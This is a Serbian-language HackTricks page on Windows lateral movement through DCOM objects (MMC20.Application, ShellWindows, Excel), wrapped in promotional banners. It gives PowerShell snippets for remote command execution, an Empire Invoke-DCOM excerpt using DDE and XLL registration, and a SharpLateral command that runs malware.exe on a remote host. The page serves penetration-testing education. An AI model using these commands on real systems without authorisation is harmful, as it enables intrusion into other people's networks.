# DCOM Izvršavanje

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivno skeniranje pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Za više informacija o ovoj tehnici pogledajte originalni post sa [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Distribuirani Component Object Model (DCOM) objekti pružaju interesantnu mogućnost za mrežno bazirane interakcije sa objektima. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Listu DCOM aplikacija možete dobiti korišćenjem PowerShell komande:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava izvršavanje skriptiranja operacija MMC snap-ina. Posebno, ovaj objekat sadrži `ExecuteShellCommand` metod pod `Document.ActiveView`. Više informacija o ovom metodu možete pronaći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite pokretanjem:

Ova funkcionalnost olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Da biste interagirali sa DCOM-om udaljeno kao administrator, PowerShell se može koristiti na sledeći način:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Metoda ExecuteShellCommand se zatim može pozvati da izvrši proces na udaljenom računaru. Proces uključuje sledeće korake:

Provera metoda:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Dobijanje daljinskog izvršenja koda (RCE):
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Za više informacija o ovoj tehnici pogledajte originalni post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Identifikovano je da objekat **MMC20.Application** nedostaje eksplicitna "LaunchPermissions" dozvola, te podrazumevano dozvoljava pristup administratorima. Za dalje detalje, može se istražiti nit [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET za filtriranje objekata bez eksplicitnih Launch Permission dozvola.

Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, su istaknuta zbog nedostatka eksplicitnih Launch Permissions dozvola. Odsustvo unosa `LaunchPermission` u registru pod `HKCR:\AppID\{guid}` ukazuje na nedostatak eksplicitnih dozvola.

###  ShellWindows
Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta koristeći njegov AppID. Ovaj proces koristi OleView .NET za dobijanje CLSID za `ShellWindows`. Nakon instanciranja, moguća je interakcija putem metode `WindowsShell.Item`, što dovodi do pozivanja metoda poput `Document.Application.ShellExecute`.

Dati su primeri PowerShell komandi za instanciranje objekta i izvršavanje komandi na daljinu:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateralno kretanje pomoću Excel DCOM objekata

Lateralno kretanje može se postići iskorišćavanjem DCOM Excel objekata. Za detaljnije informacije, preporučuje se čitanje diskusije o iskorišćavanju Excel DDE za lateralno kretanje putem DCOM-a na [Cybereasonovom blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Projekat Empire pruža PowerShell skriptu koja demonstrira upotrebu Excela za izvršavanje udaljenog koda (RCE) manipulacijom DCOM objekata. U nastavku su isečci iz skripte dostupne na [Empire-ovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode zloupotrebe Excela za RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Alati za automatizaciju lateralnog kretanja

Dva alata su istaknuta za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skript koji je dostupan u okviru Empire projekta, a koji pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim mašinama. Ovaj skript je dostupan na Empire GitHub repozitorijumu.

- **SharpLateral**: Alat dizajniran za izvršavanje koda na udaljenim mašinama, koji se može koristiti uz komandu:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatski alati

* Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) omogućava jednostavno izvršavanje svih komentarisanih načina za izvršavanje koda na drugim mašinama.
* Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Reference

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
